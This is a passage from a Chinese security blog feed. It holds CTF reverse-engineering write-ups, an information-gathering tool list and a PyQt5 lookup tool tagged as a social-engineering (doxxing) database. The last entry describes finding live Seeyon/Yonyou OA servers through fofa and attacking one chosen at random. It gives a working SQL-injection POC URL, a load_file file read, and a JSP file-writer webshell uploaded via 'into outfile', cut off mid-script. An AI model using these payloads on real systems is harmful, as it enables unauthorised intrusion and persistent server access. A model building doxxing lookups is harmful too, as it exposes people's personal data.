    <content type="html"><![CDATA[<h2 id="与Re的初次邂逅😱"><a href="#与Re的初次邂逅😱" class="headerlink" title="与Re的初次邂逅😱"></a>与Re的初次邂逅😱</h2><span id="more"></span><h3 id="记录一些IDA的操作"><a href="#记录一些IDA的操作" class="headerlink" title="记录一些IDA的操作"></a>记录一些IDA的操作</h3><p>因为第一次做逆向题，所以IDA也不怎么会用😭，所以浅浅记录下</p><ul><li>IDA有两个版本：一个是打开32位程序的，一个是打开64位程序的，一定要用对，否则不能查看反汇编的代码</li><li>快捷键：<code>shift+F12</code>打开字符串预览，<code>F5</code>打开反汇编代码，<code>n</code>重命名函数或者变量，<code>/</code>是对该行添加注释</li></ul><p><img src="/2023/09/14/%E4%B8%8ERe%E7%9A%84%E5%88%9D%E6%AC%A1%E9%82%82%E9%80%85/1.jpg"></p><h3 id="ctfshow-re2"><a href="#ctfshow-re2" class="headerlink" title="ctfshow-re2"></a>ctfshow-re2</h3><p>是个32位的程序，用IDA打开，首先打开<code>strings</code>快速检索信息：</p><p><img src="/2023/09/14/%E4%B8%8ERe%E7%9A%84%E5%88%9D%E6%AC%A1%E9%82%82%E9%80%85/Snipaste_2023-09-14_17-28-39.png"></p><p>检索到一个敏感字符串，以及两个文件名，一个<code>enflag.txt</code>已经提供</p><p>连续定位到读取文件的位置，找到主函数：</p><p><img src="/2023/09/14/%E4%B8%8ERe%E7%9A%84%E5%88%9D%E6%AC%A1%E9%82%82%E9%80%85/Snipaste_2023-09-14_17-33-49.png"></p><p>查看其反汇编代码：</p><p>这里出现了一点小问题，在查看返回编代码时出现栈顶指针地址为负的情况，导致反汇编失败，通俗来说就是IDA不能识别主函数的大括号具体在哪</p><p><img src="/2023/09/14/%E4%B8%8ERe%E7%9A%84%E5%88%9D%E6%AC%A1%E9%82%82%E9%80%85/Snipaste_2023-09-14_17-45-50.png"></p><p>解决办法：打开<code>Options/general</code>，勾选<code>Stack pointer</code>，用于显示栈顶指针的位置</p><p><img src="/2023/09/14/%E4%B8%8ERe%E7%9A%84%E5%88%9D%E6%AC%A1%E9%82%82%E9%80%85/Snipaste_2023-09-14_17-47-21.png"></p><p>这个时候可以看到地址了，然后修改最后一个地址为正数的地址</p><p><img src="/2023/09/14/%E4%B8%8ERe%E7%9A%84%E5%88%9D%E6%AC%A1%E9%82%82%E9%80%85/Snipaste_2023-09-14_17-50-29.png"></p><p>我这里修改为<code>-0x440</code>，将最后一个位置<code>retn</code>那里设为栈顶指针</p><p><img src="/2023/09/14/%E4%B8%8ERe%E7%9A%84%E5%88%9D%E6%AC%A1%E9%82%82%E9%80%85/Snipaste_2023-09-14_17-52-25.png"></p><p>然后我们就可以看出反汇编的代码了：</p><p><img src="/2023/09/14/%E4%B8%8ERe%E7%9A%84%E5%88%9D%E6%AC%A1%E9%82%82%E9%80%85/Snipaste_2023-09-14_17-53-56.png"></p><p>分析程序：先把一些明显的函数和变量改成易读的名字</p><p>分析的过程中发现了这样一个函数：</p><p><img src="/2023/09/14/%E4%B8%8ERe%E7%9A%84%E5%88%9D%E6%AC%A1%E9%82%82%E9%80%85/Snipaste_2023-09-14_18-03-25.png"></p><p>点击进去后：发现了我们熟悉的字符串，说明这个函数是校验逻辑，将输入的<code>Key(Str)</code>做了一个异或赋值给了内置的字符串<code>Str1</code>，然后判断<code>Str1</code>的值是否等于<code>DH~mqqvqxB^||zll@Jq~jkwpmvez&#123;</code>，由此我们可以爆破出<code>Key</code>的值</p><p><img src="/2023/09/14/%E4%B8%8ERe%E7%9A%84%E5%88%9D%E6%AC%A1%E9%82%82%E9%80%85/Snipaste_2023-09-14_18-04-42.png"></p><p>写脚本出<code>Key</code>值：<code>[Warnning]Access_Unauthorized</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">s = <span class="hljs-string">&quot;DH~mqqvqxB^||zll@Jq~jkwpmvez&#123;&quot;</span><br>Key = <span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">29</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">130</span>):<br>        <span class="hljs-keyword">if</span> j^<span class="hljs-number">0x1F</span>==<span class="hljs-built_in">ord</span>(s[i]):<br>            Key+=<span class="hljs-built_in">chr</span>(j)<br>            <span class="hljs-built_in">print</span>(Key)<br></code></pre></td></tr></table></figure><p>之后下面那个函数点进去发现就是加密函数，看不懂😭😭😭，再看看其他的</p><p>这时候发现，为什么读入的是<code>flag.txt</code>，而给我的是<code>enflag.txt</code>，这应该是答案输出的文本，那么合理推测，<code>enflag.txt</code>里应该就是被加密的文本，所以我们改一下名称，然后运行程序，输入<code>Key</code>，然后输出答案？🐸</p><p><img src="/2023/09/14/%E4%B8%8ERe%E7%9A%84%E5%88%9D%E6%AC%A1%E9%82%82%E9%80%85/Snipaste_2023-09-14_18-28-12.png"></p><p>答案是的！蒙对了🐸，<code>flag</code>输出在了程序新建的<code>enflag.txt</code>里：<code>flag&#123;RC4&amp;-&gt;ENc0d3F1le&#125;</code></p><h3 id="ctfshow-re3"><a href="#ctfshow-re3" class="headerlink" title="ctfshow-re3"></a>ctfshow-re3</h3><p>是个64位的程序，用IDA打开，然后反汇编，得到如下结果</p><p><img src="/2023/09/14/%E4%B8%8ERe%E7%9A%84%E5%88%9D%E6%AC%A1%E9%82%82%E9%80%85/Snipaste_2023-09-14_10-38-18.png"></p><p>首先拿到题目，一步一步来看，到<code>strncpy</code>这个位置，发现是将<code>v19</code>的前<code>n</code>个字符复制到<code>dest</code>里 ，然后发现<code>v19</code>根本没有被赋值😂，那<code>copy</code>了个啥呢</p><p>我们发现，<code>s[5]</code>和<code>v19</code>是连续定义的</p><p><img src="/2023/09/14/%E4%B8%8ERe%E7%9A%84%E5%88%9D%E6%AC%A1%E9%82%82%E9%80%85/Snipaste_2023-09-14_11-10-36.png"></p><p>查看变量的栈：直接点击变量进去，发现两个变量在<code>main</code>的栈中确实是连续的，那么猜测存在溢出</p><p><img src="/2023/09/14/%E4%B8%8ERe%E7%9A%84%E5%88%9D%E6%AC%A1%E9%82%82%E9%80%85/Snipaste_2023-09-14_11-18-09.png"></p><p>点击<code>read_input</code>进去，</p><p><img src="/2023/09/14/%E4%B8%8ERe%E7%9A%84%E5%88%9D%E6%AC%A1%E9%82%82%E9%80%85/Snipaste_2023-09-14_15-17-01.png"></p><p>发现确实使用了<code>scan</code>而且没有指定读入长度，那么确实存在溢出，输入的内容前五个字符存在<code>s</code>，其他的都溢出到了<code>v19</code>变量中</p><p><img src="/2023/09/14/%E4%B8%8ERe%E7%9A%84%E5%88%9D%E6%AC%A1%E9%82%82%E9%80%85/Snipaste_2023-09-14_15-18-32.png"></p><p>这下解决了<code>v19</code>的问题，</p><p>然后再往下看，读入内容进入变量<code>v5</code>，最后赋值给了<code>array[6]</code>，然后进入循环，将<code>array</code>中的内容一次加到变量<code>a</code>中，最后会加上我们的输入，所以答案就是用<code>0xFFFF</code>减去<code>a</code>最后的值，因为这里我们设置<code>v5</code>的值为0</p><p><img src="/2023/09/14/%E4%B8%8ERe%E7%9A%84%E5%88%9D%E6%AC%A1%E9%82%82%E9%80%85/Snipaste_2023-09-14_16-27-07.png"></p><p>所以答案就是<code>hex(65525-58720)</code>，为<code>1A9F</code>，这里填答案，出题者设置的是小写字母</p><p><img src="/2023/09/14/%E4%B8%8ERe%E7%9A%84%E5%88%9D%E6%AC%A1%E9%82%82%E9%80%85/Snipaste_2023-09-14_16-31-48.png"></p><p>贴上通关逻辑：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-type">int</span> array[<span class="hljs-number">8</span>]=&#123;<span class="hljs-number">80</span>,<span class="hljs-number">64227</span>,<span class="hljs-number">226312059</span>,<span class="hljs-number">-1540056586</span>,<span class="hljs-number">20496</span>,<span class="hljs-number">3833</span>,<span class="hljs-number">6815</span>&#125;;<br>    <span class="hljs-type">unsigned</span> __int64 a=<span class="hljs-number">0LL</span>;<br>    <span class="hljs-type">int</span> v15=<span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> v14;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">6</span>; ++i )<br>    &#123;<br>        <span class="hljs-keyword">for</span> ( a += (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)array[i]; a &gt; <span class="hljs-number">0xFFFF</span>; a = v15 + (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)(<span class="hljs-type">unsigned</span> __int16)a )<span class="hljs-comment">// a&gt;65535</span><br>        &#123;<br>            v14 = (<span class="hljs-type">unsigned</span> __int16)a;<br>            v15 = a &gt;&gt; <span class="hljs-number">16</span>;<br>        &#125;<br>  &#125;<br>  <span class="hljs-keyword">if</span> ( a == <span class="hljs-number">0xFFFF</span> )<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;OK&quot;</span>);<br>  <span class="hljs-keyword">else</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Error&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>信息收集思路总结(持续完善)</title>
    <link href="/2023/09/09/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93-%E6%8C%81%E7%BB%AD%E5%AE%8C%E5%96%84/"/>
    <url>/2023/09/09/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93-%E6%8C%81%E7%BB%AD%E5%AE%8C%E5%96%84/</url>
    
    <content type="html"><![CDATA[<p>总结一些用到的信息收集手法🐸🐸🐸</p><span id="more"></span><h2 id="如何快速寻得目标的大量资产"><a href="#如何快速寻得目标的大量资产" class="headerlink" title="如何快速寻得目标的大量资产"></a>如何快速寻得目标的大量资产</h2><h3 id="子域名收集"><a href="#子域名收集" class="headerlink" title="子域名收集"></a>子域名收集</h3><h4 id="子域名挖掘机Layer"><a href="#子域名挖掘机Layer" class="headerlink" title="子域名挖掘机Layer"></a>子域名挖掘机Layer</h4><p>将主域名输入即可使用，字典很大，爆破效率也挺高的，支持导出为<code>txt</code>文件，蛮方便的</p><p><img src="/2023/09/09/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93-%E6%8C%81%E7%BB%AD%E5%AE%8C%E5%96%84/Snipaste_2023-09-09_20-01-40.png"></p><h3 id="存活探测"><a href="#存活探测" class="headerlink" title="存活探测"></a>存活探测</h3><h4 id="Finger"><a href="#Finger" class="headerlink" title="Finger"></a>Finger</h4><p>蛮好用的一个对大量资产进行存活探测的脚本，最后会输出一个表格文件</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">python Finger.py -f ./test.txt<br></code></pre></td></tr></table></figure><p><img src="/2023/09/09/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93-%E6%8C%81%E7%BB%AD%E5%AE%8C%E5%96%84/Snipaste_2023-09-09_20-26-03.png"></p><h4 id="observer-ward"><a href="#observer-ward" class="headerlink" title="observer_ward"></a>observer_ward</h4><p>团队开发的工具，支持的参数比较多一点，闭源，扫描的要慢一点，但是细节更多，还会自动划分优先级，也蛮好用的</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">.\observer_ward.exe -f ..\Finger-main\chehejia.com.txt<br></code></pre></td></tr></table></figure><p><img src="/2023/09/09/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93-%E6%8C%81%E7%BB%AD%E5%AE%8C%E5%96%84/Snipaste_2023-09-09_20-36-39.png"></p><p><img src="/2023/09/09/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93-%E6%8C%81%E7%BB%AD%E5%AE%8C%E5%96%84/Snipaste_2023-09-09_20-36-50.png"></p>]]></content>
    
    
    <categories>
      
      <category>SRC</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SRC</tag>
      
      <tag>技巧</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>用Python编写一个xx库查询demo</title>
    <link href="/2023/09/05/%E7%94%A8Python%E7%BC%96%E5%86%99%E4%B8%80%E4%B8%AAxx%E5%BA%93%E6%9F%A5%E8%AF%A2demo/"/>
    <url>/2023/09/05/%E7%94%A8Python%E7%BC%96%E5%86%99%E4%B8%80%E4%B8%AAxx%E5%BA%93%E6%9F%A5%E8%AF%A2demo/</url>
    
    <content type="html"><![CDATA[<p>用<code>Python</code>编写了一个自用的xx库查询小demo😘</p><span id="more"></span><h2 id="xx库查询小demo"><a href="#xx库查询小demo" class="headerlink" title="xx库查询小demo"></a>xx库查询小demo</h2><h3 id="初衷和设计"><a href="#初衷和设计" class="headerlink" title="初衷和设计"></a>初衷和设计</h3><h4 id="初衷"><a href="#初衷" class="headerlink" title="初衷"></a>初衷</h4><p>咱们就是说自己整理了一个<code>excel</code>文档，我想要像个专业人士去处理它🐸🐸</p><h4 id="设计"><a href="#设计" class="headerlink" title="设计"></a>设计</h4><p>采用<code>Python</code>去写，库最多，写起来最顺畅哈哈，唯一不方便的就是打成<code>exe</code>有点大哈哈</p><p>用到的库：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> pandas <span class="hljs-keyword">as</span> pd <span class="hljs-comment">#处理excel文档</span><br><span class="hljs-comment"># 图像界面</span><br><span class="hljs-keyword">from</span> PyQt5.QtWidgets <span class="hljs-keyword">import</span> QApplication, QMainWindow, QLabel, QHBoxLayout, QVBoxLayout, QPushButton, QWidget, QLineEdit, QTableWidget, QTableWidgetItem, QHeaderView, QMessageBox, QCheckBox, QFileDialog<br><span class="hljs-keyword">from</span> PyQt5.QtGui <span class="hljs-keyword">import</span> QIcon, QPixmap, QFont<br></code></pre></td></tr></table></figure><h3 id="编写过程中学到的知识"><a href="#编写过程中学到的知识" class="headerlink" title="编写过程中学到的知识"></a>编写过程中学到的知识</h3><h4 id="PyQT5使用"><a href="#PyQT5使用" class="headerlink" title="PyQT5使用"></a>PyQT5使用</h4><p>在使用定义一个图像界面时，最好是定义成一个类，然后在类里写处理函数，直接用<code>this</code>去处理，非常方便</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MainWindow</span>(<span class="hljs-title class_ inherited__">QMainWindow</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">super</span>().__init__()<br>        <span class="hljs-keyword">pass</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">handle_func</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">pass</span><br></code></pre></td></tr></table></figure><p><strong>我们需要注意的是，凡是在类里面定义的函数，都需要一个固定参数<code>self</code>，否则会报错</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">Traceback (most recent call last):<br>  File &quot;e:\Social_Work_Library\src\search.py&quot;, line 126, in handle_search<br>    results = self.search(self.search_box.text())<br>              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^<br>TypeError: MainWindow.search() takes 1 positional argument but 2 were given<br></code></pre></td></tr></table></figure><p><img src="/2023/09/05/%E7%94%A8Python%E7%BC%96%E5%86%99%E4%B8%80%E4%B8%AAxx%E5%BA%93%E6%9F%A5%E8%AF%A2demo/Snipaste_2023-09-06_15-03-10.png"></p><p>添加一个<code>self</code>参数即可修复：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">search</span>(<span class="hljs-params">self,search_string</span>):<br>       <span class="hljs-comment"># 处理未选择文件的情况</span><br>       <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(data_frame) == <span class="hljs-number">0</span>:<br></code></pre></td></tr></table></figure><p>一个可以复用的文件选择控件：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 控件定义</span><br>    self.file_button = QPushButton(<span class="hljs-string">&quot;选择文件&quot;</span>)<br>        self.file_button.clicked.connect(self.select_file)<br>        self.file_button.setStyleSheet(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">            QPushButton &#123;</span><br><span class="hljs-string">                background-color: #4CAF50;</span><br><span class="hljs-string">                color: white;</span><br><span class="hljs-string">                border: none;</span><br><span class="hljs-string">                border-radius: 5px;</span><br><span class="hljs-string">                padding: 10px 20px;</span><br><span class="hljs-string">                font-family: SimSun;</span><br><span class="hljs-string">            &#125;</span><br><span class="hljs-string">            QPushButton:hover &#123;</span><br><span class="hljs-string">                background-color: #45a049;</span><br><span class="hljs-string">            &#125;</span><br><span class="hljs-string">            QPushButton:pressed &#123;</span><br><span class="hljs-string">                background-color: #398037;</span><br><span class="hljs-string">            &#125;</span><br><span class="hljs-string">        &quot;&quot;&quot;</span>)<br>        layout.addWidget(self.file_button)<br><span class="hljs-comment"># 文件选择函数</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">select_file</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">try</span>:<br>            file_dialog = QFileDialog()<br>            file_dialog.setFileMode(QFileDialog.ExistingFile)  <span class="hljs-comment"># 设置为选择现有文件</span><br>            file_dialog.setNameFilters([<span class="hljs-string">&quot;表格 (*.xlsx)&quot;</span>])  <span class="hljs-comment"># 设置文件过滤器</span><br>            file_dialog.exec_()<br>            file_paths = file_dialog.selectedFiles()<br>            file_path = file_paths[<span class="hljs-number">0</span>]<br>            <span class="hljs-keyword">if</span> file_path:<br>                <span class="hljs-keyword">global</span> data_frame<br>                data_frame = pd.read_excel(file_path)<br>                success_dialog = QMessageBox()<br>                icon = QIcon(<span class="hljs-string">&quot;./src/success.ico&quot;</span>)<br>                success_dialog.setWindowIcon(icon)<br>                success_dialog.setWindowTitle(<span class="hljs-string">&quot;Success!!!&quot;</span>)<br>                success_dialog.setText(<span class="hljs-string">f&quot;文件路径是：<span class="hljs-subst">&#123;file_path&#125;</span>&quot;</span>)<br>                success_dialog.exec_()<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            error_dialog = QMessageBox()<br>            icon = QIcon(<span class="hljs-string">&quot;./src/error.ico&quot;</span>)<br>            error_dialog.setWindowIcon(icon)<br>            error_dialog.setIcon(QMessageBox.Critical)<br>            error_dialog.setWindowTitle(<span class="hljs-string">&quot;Sad~~~&quot;</span>)<br>            error_dialog.setText(<span class="hljs-string">&quot;错误信息&quot;</span>)<br>            error_dialog.exec_()<br></code></pre></td></tr></table></figure><h4 id="将Python程序打包成一个最小的exe"><a href="#将Python程序打包成一个最小的exe" class="headerlink" title="将Python程序打包成一个最小的exe"></a>将Python程序打包成一个最小的exe</h4><p>之前直接用电脑自带的<code>Python</code>环境打包，直接打了我400多<code>MB</code>，就离谱</p><p>选择用<code>conda</code>重建一个虚拟的环境，仅仅使用我们需要的包和基础环境，这样打包下来会小很多</p><p>方法如下：</p><p>建立一个新的环境，并切换进去</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">conda create -n virtual_exe python==3.8<br>conda activate virtual_exe<br>conda list<br></code></pre></td></tr></table></figure><p><code>conda</code>安装的虚拟环境，会把虚拟环境的目录生成在<code>anaconda</code>安装目录下的<code>env</code>目录下</p><p><img src="/2023/09/05/%E7%94%A8Python%E7%BC%96%E5%86%99%E4%B8%80%E4%B8%AAxx%E5%BA%93%E6%9F%A5%E8%AF%A2demo/Snipaste_2023-09-06_15-39-53.png"></p><p>可以发现新建的环境非常清爽👍👍</p><p>下载我们所需要的包：<code>pyinstaller</code>，<code>pandas</code>，<code>PyQt5</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">pip install -i https://pypi.tuna.tsinghua.edu.cn/simple pandas<br> <br>pip install -i https://pypi.tuna.tsinghua.edu.cn/simple PyQt5<br> <br>pip install -i https://pypi.tuna.tsinghua.edu.cn/simple pyinstaller<br></code></pre></td></tr></table></figure><p>切换到我们源文件所在的目录，用<code>Pyinstaller</code>打包</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">Pyinstaller -F -w -i title.ico search.py<br></code></pre></td></tr></table></figure><p><img src="/2023/09/05/%E7%94%A8Python%E7%BC%96%E5%86%99%E4%B8%80%E4%B8%AAxx%E5%BA%93%E6%9F%A5%E8%AF%A2demo/Snipaste_2023-09-06_15-15-50.png"></p><p>打包成功：</p><p><img src="/2023/09/05/%E7%94%A8Python%E7%BC%96%E5%86%99%E4%B8%80%E4%B8%AAxx%E5%BA%93%E6%9F%A5%E8%AF%A2demo/Snipaste_2023-09-06_15-19-13.png"></p><p>在当前目录的<code>dist</code>目录下：</p><p><img src="/2023/09/05/%E7%94%A8Python%E7%BC%96%E5%86%99%E4%B8%80%E4%B8%AAxx%E5%BA%93%E6%9F%A5%E8%AF%A2demo/Snipaste_2023-09-06_15-19-53.png"></p><p>双击正常运行：😘</p><p><img src="/2023/09/05/%E7%94%A8Python%E7%BC%96%E5%86%99%E4%B8%80%E4%B8%AAxx%E5%BA%93%E6%9F%A5%E8%AF%A2demo/Snipaste_2023-09-06_15-21-16.png"></p><p>——————————————————————————————————————————</p><p>最后附上<a href="https://github.com/REMIXXYH/Social_Work_lib_EXE">项目地址</a>😐</p>]]></content>
    
    
    <categories>
      
      <category>工具编写</category>
      
    </categories>
    
    
    <tags>
      
      <tag>工具编写</tag>
      
      <tag>社工库</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>一次公益SRC挖掘-230903</title>
    <link href="/2023/09/04/%E4%B8%80%E6%AC%A1%E5%85%AC%E7%9B%8ASRC%E6%8C%96%E6%8E%98-230903/"/>
    <url>/2023/09/04/%E4%B8%80%E6%AC%A1%E5%85%AC%E7%9B%8ASRC%E6%8C%96%E6%8E%98-230903/</url>
    
    <content type="html"><![CDATA[<p>记一次由SQL注入到RCE😎</p><span id="more"></span><h3 id="fofa寻找到目标"><a href="#fofa寻找到目标" class="headerlink" title="fofa寻找到目标"></a>fofa寻找到目标</h3><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">header</span>=<span class="hljs-string">&quot;/yyoa&quot;</span>&amp;&amp;body!=<span class="hljs-string">&quot;您使用的浏览器不适合本系统运行要求&quot;</span><br></code></pre></td></tr></table></figure><p>寻找到致远用友OA的站点</p><p><img src="/2023/09/04/%E4%B8%80%E6%AC%A1%E5%85%AC%E7%9B%8ASRC%E6%8C%96%E6%8E%98-230903/Snipaste_2023-09-04_15-41-48.png"></p><p>寻找到一大堆，随便找一个访问啦</p><h3 id="发现存在Nday——SQL注入"><a href="#发现存在Nday——SQL注入" class="headerlink" title="发现存在Nday——SQL注入"></a>发现存在Nday——SQL注入</h3><p>首先访问到登陆页面啦:<a href="http://xxx.xxx.xxx.xxx:8001/yyoa/index.jsp">http://xxx.xxx.xxx.xxx:8001/yyoa/index.jsp</a></p><p><img src="/2023/09/04/%E4%B8%80%E6%AC%A1%E5%85%AC%E7%9B%8ASRC%E6%8C%96%E6%8E%98-230903/Snipaste_2023-09-04_15-45-31.png"></p><p>直接上工具扫：</p><p>发现存在SQL注入Nday，那就不废话了，直接打POC：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">http://x.x.x.x:8001/yyoa/common/js/menu/test.jsp?doType=101&amp;S1=(SELECT%20@@basedir)<br></code></pre></td></tr></table></figure><p><img src="/2023/09/04/%E4%B8%80%E6%AC%A1%E5%85%AC%E7%9B%8ASRC%E6%8C%96%E6%8E%98-230903/Snipaste_2023-09-04_15-47-12.png"></p><p>出现回显，SQL注入，直接一个妥妥的高危了</p><p><img src="/2023/09/04/%E4%B8%80%E6%AC%A1%E5%85%AC%E7%9B%8ASRC%E6%8C%96%E6%8E%98-230903/Snipaste_2023-09-04_11-43-50.png"></p><h3 id="上传webshell拿到RCE"><a href="#上传webshell拿到RCE" class="headerlink" title="上传webshell拿到RCE"></a>上传webshell拿到RCE</h3><p>但是仅仅这样感觉太容易了，根路径都出来了，想拿个<code>webshell</code>试试，于是进行操作：</p><p>首先我们不妨猜测一下网页路径：<code>Google</code>一下得到大概应该是这样的：<code>D:/UFseeyon_2020/OA/tomcat/webapps/yyoa/</code></p><p>然后得验证一下：</p><p>使用<code>mysql</code>里自带的<code>load_file</code>函数验证一下：<code>/yyoa/common/js/menu/test.jsp?doType=101&amp;S1=select%20load_file(%27D:/UFseeyon_2020/OA/tomcat/webapps/yyoa/WEB-INF/web.xml%27)</code></p><p>确实存在哈，lucky😊</p><p><img src="/2023/09/04/%E4%B8%80%E6%AC%A1%E5%85%AC%E7%9B%8ASRC%E6%8C%96%E6%8E%98-230903/Snipaste_2023-09-04_16-13-52.png"></p><p>查阅了一下知识库，需要分两步走：</p><p>利用<code>mysql into outfile</code>写<code>shell</code>：由于<code>jsp</code>一句话超长，请求连接会拒绝，故先上传写文件脚本，再本地构造上传页面进行<code>RCE</code>脚本的上传</p><h4 id="上传写文件脚本"><a href="#上传写文件脚本" class="headerlink" title="上传写文件脚本"></a>上传写文件脚本</h4><p>脚本内容如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;%<span class="hljs-keyword">if</span>(request.getParameter(<span class="hljs-string">&quot;f&quot;</span>)!=<span class="hljs-literal">null</span>)(<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.FileOutputStream(application.getRealPath(<span class="hljs-string">&quot;&quot;</span>)+request.getParameter(<span class="hljs-string">&quot;f&quot;</span>))).write(request.getParameter(<span 